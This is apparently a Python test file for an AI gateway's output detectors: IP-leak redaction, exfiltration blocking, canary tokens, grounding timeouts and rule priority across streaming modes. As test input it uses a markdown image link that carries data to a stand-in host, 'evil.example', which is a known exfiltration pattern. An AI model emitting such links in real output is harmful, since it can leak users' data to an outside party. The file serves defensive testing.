# ruff: noqa: E501  (GW33 test file: long assertion/docstring lines kept readable)
"""GW33 task 9.2/9.5: the per-request output detector composer (D-2, D-22, D-23, D-28, D-32)."""
from __future__ import annotations

from gateway_v2.detect.output.ip_leak import IpLeakDetector
from gateway_v2.domain import (
    Action,
    Category,
    FailurePosture,
    FindingStatus,
    Mode,
    Rule,
    RuleCondition,
    RuleKind,
    RuleScope,
    StreamingMode,
    Surface,
)
from gateway_v2.edge.canary_inject import CanaryTicket
from gateway_v2.edge.output_detectors import (
    OutputDetectors,
    build_output_detectors,
    legacy_ip_rules,
)
from tests.e2e.gw33_support import TOKEN, builtin, contract, plan_of, rule, run

_C = contract()
_INCR = StreamingMode.INCREMENTAL
_STRICT = StreamingMode.STRICT_WITHHOLD


def _build(plan, **kw):  # type: ignore[no-untyped-def]
    args = {"base": None, "ticket": None, "context_chunks": (), "backend": None,
            "contract": _C, "runner": None}
    args.update(kw)
    return build_output_detectors(plan, **args)


def _base(_text: str):  # type: ignore[no-untyped-def]
    return ()


def test_no_new_family_is_the_identity_and_holds_no_extra_hook() -> None:
    """Requirements 2.9/8.7: a plan without new categories changes nothing."""
    for mode in (_INCR, _STRICT):
        plan = plan_of(mode, rule("r", Category.PII, Action.REDACT))
        out = _build(plan, base=_base)
        assert out == OutputDetectors(per_delta=_base, sync_whole=_base)
        assert out.detector_for(mode) is _base
        assert out.canary_delta is None and out.final is None
    empty = _build(plan_of(_INCR), base=None)
    assert empty == OutputDetectors()


def test_customer_rows_in_the_exfil_fallback_category_select_no_detector() -> None:
    """D-28: a customer rule never selects a built-in detector, whatever its category label."""
    customers = (
        RuleCondition(RuleKind.KEYWORDS, "", RuleScope.OUTPUT, ("k",), "", "", ""),
        RuleCondition(RuleKind.REGEX, "", RuleScope.OUTPUT, (), "a+b", "", ""),
        RuleCondition(RuleKind.DETECTOR, "", RuleScope.OUTPUT, (), "", "customer.thing", ""),
        None,
    )
    for condition in customers:
        r = Rule("pol-1", Category.EXFIL, Mode.ENFORCE, Action.BLOCK, None, 100, RuleScope.OUTPUT,
                 FailurePosture.FAIL_CLOSED, frozenset({Surface.CHAT}), condition)
        assert _build(plan_of(_INCR, r), base=_base) == OutputDetectors(per_delta=_base,
                                                                         sync_whole=_base)


def test_mode_to_detector_assignment() -> None:
    ip = rule("out_ip_leak", Category.IP_LEAK, Action.FLAG, "output.ip_leak")
    exfil = rule("out_exfil", Category.EXFIL, Action.FLAG, "output.exfil")
    canary = rule("out_canary", Category.CANARY, Action.BLOCK, "output.canary")
    ground = rule("out_ground", Category.HALLUCINATION, Action.FLAG, "output.grounding.lexical")
    ticket = CanaryTicket(TOKEN)
    incr = _build(plan_of(_INCR, ip, exfil, canary, ground), base=_base, ticket=ticket,
                  context_chunks=("ctx words here",))
    assert incr.per_delta is _base and incr.sync_whole is None
    assert incr.canary_delta is not None and incr.final is not None
    strict_plan = plan_of(
        _STRICT, rule("out_ip_leak", Category.IP_LEAK, Action.REDACT, "output.ip_leak"), exfil,
        canary, ground,
    )
    strict = _build(strict_plan, base=_base, ticket=ticket, context_chunks=("ctx words here",))
    assert strict.sync_whole is not None and strict.per_delta is None
    assert strict.canary_delta is None and strict.final is not None  # grounding only
    assert strict.detector_for(_STRICT) is strict.sync_whole
    no_ticket = _build(plan_of(_INCR, canary), base=_base, ticket=None)
    assert no_ticket.canary_delta is None  # not injected: canary_checked stays False


def test_composed_findings_carry_the_platform_rule_id_and_a_fixed_order() -> None:
    plan = plan_of(
        _STRICT,
        rule("out_ip_leak", Category.IP_LEAK, Action.REDACT, "output.ip_leak"),
        rule("out_exfil", Category.EXFIL, Action.REDACT, "output.exfil"),
    )
    out = _build(plan, base=_base)
    assert out.sync_whole is not None
    findings = out.sync_whole("host 10.0.0.1 ![x](https://evil.example/p?d=" + "a" * 60 + ")")
    assert [f.detector for f in findings] == ["out_ip_leak", "out_exfil"]


def test_a_composer_level_exception_is_one_unavailable_finding() -> None:
    plan = plan_of(_STRICT, rule("out_ip_leak", Category.IP_LEAK, Action.REDACT, "output.ip_leak"))
    out = _build(plan, base=_base)
    assert out.sync_whole is not None
    findings = out.sync_whole(None)  # type: ignore[arg-type]
    assert [f.status for f in findings] == [FindingStatus.UNAVAILABLE]


def _legacy_plan(mode: StreamingMode, action: Action):  # type: ignore[no-untyped-def]
    legacy = Rule("fw-exfil-output", Category.EXFIL, Mode.ENFORCE, action, None, 100,
                  RuleScope.OUTPUT, FailurePosture.FAIL_CLOSED, frozenset({Surface.CHAT}))
    return plan_of(mode, legacy)


def test_legacy_ip_rule_is_inert_in_incremental_and_enforced_in_strict() -> None:
    """D-2: the shipped `fw-exfil-output` rule enforced nothing before this card."""
    plan_i = _legacy_plan(_INCR, Action.REDACT)
    assert [r.rule_id for r in legacy_ip_rules(plan_i)] == ["fw-exfil-output"]
    inert = _build(plan_i, base=_base)
    assert inert.legacy_rule_ids == ("fw-exfil-output",)
    assert inert.canary_delta is None and inert.final is None  # no hook, nothing built
    text = "connect to 10.0.0.1 now"
    kept = run(plan_i, [("output_content", text)])
    assert kept.released == text  # status quo: inert
    for action in (Action.REDACT, Action.BLOCK):
        strict = run(_legacy_plan(_STRICT, action), [("output_content", text)])
        if action is Action.REDACT:
            assert "10.0.0.1" not in strict.released and "[REDACTED]" in strict.released
        else:
            assert strict.released == "" and strict.codes == ["output_blocked"]


def test_a_customer_row_cannot_downgrade_a_builtin_finding_end_to_end() -> None:
    """D-32 through the real pipeline: priority 1000 `allow` next to `out_exfil` `block`."""
    customer = Rule("pol-1-det", Category.EXFIL, Mode.ENFORCE, Action.ALLOW, None, 1000,
                    RuleScope.OUTPUT, FailurePosture.FAIL_OPEN, frozenset({Surface.CHAT}),
                    builtin("customer.thing"))
    plan = plan_of(_STRICT, rule("out_exfil", Category.EXFIL, Action.BLOCK, "output.exfil"),
                   customer)
    text = "![x](https://evil.example/p?d=" + "a" * 60 + ")"
    result = run(plan, [("output_content", text)])
    assert result.released == "" and result.codes == ["output_blocked"]


def test_the_ip_detector_instance_is_built_from_the_contract_bounds() -> None:
    # The composer must use the contract-derived OutputBounds (D-30), never a private literal.
    assert IpLeakDetector(bounds=_C.output_bounds()).bounds == _C.output_bounds()


def test_strict_sync_detectors_run_through_the_injected_executor_runner() -> None:
    """D-22/L-3: `_finalize` never scans inline on the loop when an executor is wired."""
    calls: list[int] = []

    async def spy(fn):  # type: ignore[no-untyped-def]
        calls.append(1)
        return fn()

    plan = plan_of(_STRICT, rule("out_ip_leak", Category.IP_LEAK, Action.REDACT, "output.ip_leak"))
    composed = _build(plan, base=_base, runner=spy)
    result = run(plan, [("output_content", "host 10.0.0.1 up")], composed=composed)
    assert calls and "10.0.0.1" not in result.released


class _SlowBackend:
    """Advertises hallucination but never answers inside the wait budget."""

    supported_categories = frozenset({Category.HALLUCINATION})

    async def classify(self, windows, budget):  # type: ignore[no-untyped-def]
        import asyncio

        await asyncio.sleep(2.0)
        return []

    async def readiness(self):  # type: ignore[no-untyped-def]  # pragma: no cover
        raise NotImplementedError

    def capacity_hint(self):  # type: ignore[no-untyped-def]  # pragma: no cover
        raise NotImplementedError


def test_a_grounding_timeout_is_one_unavailable_finding_routed_by_mode() -> None:
    """D-22: `asyncio.wait_for(grounding_wait_budget_s())`; a timeout is UNAVAILABLE, never clean."""
    fast = contract(0.5)  # wait budget = 0.05 s
    klass = "output.grounding.model:slow"
    for mode, action, blocked in ((_INCR, Action.FLAG, False), (_STRICT, Action.BLOCK, True)):
        plan = plan_of(mode, rule("g", Category.HALLUCINATION, action, klass))
        composed = _build(plan, contract=fast, backend=_SlowBackend(),
                          context_chunks=("some context words",))
        result = run(plan, [("output_content", "an answer")], composed=composed)
        if blocked:  # STRICT + FAIL_CLOSED: nothing was released, so the posture is honoured
            assert result.released == "" and result.codes == ["output_blocked"]
        else:  # INCREMENTAL: reported, never enforced
            assert result.released == "an answer" and result.codes == []
            assert result.stats.review_required is True  # type: ignore[attr-defined]
            assert result.stats.final_check_unavailable == 1  # type: ignore[attr-defined]
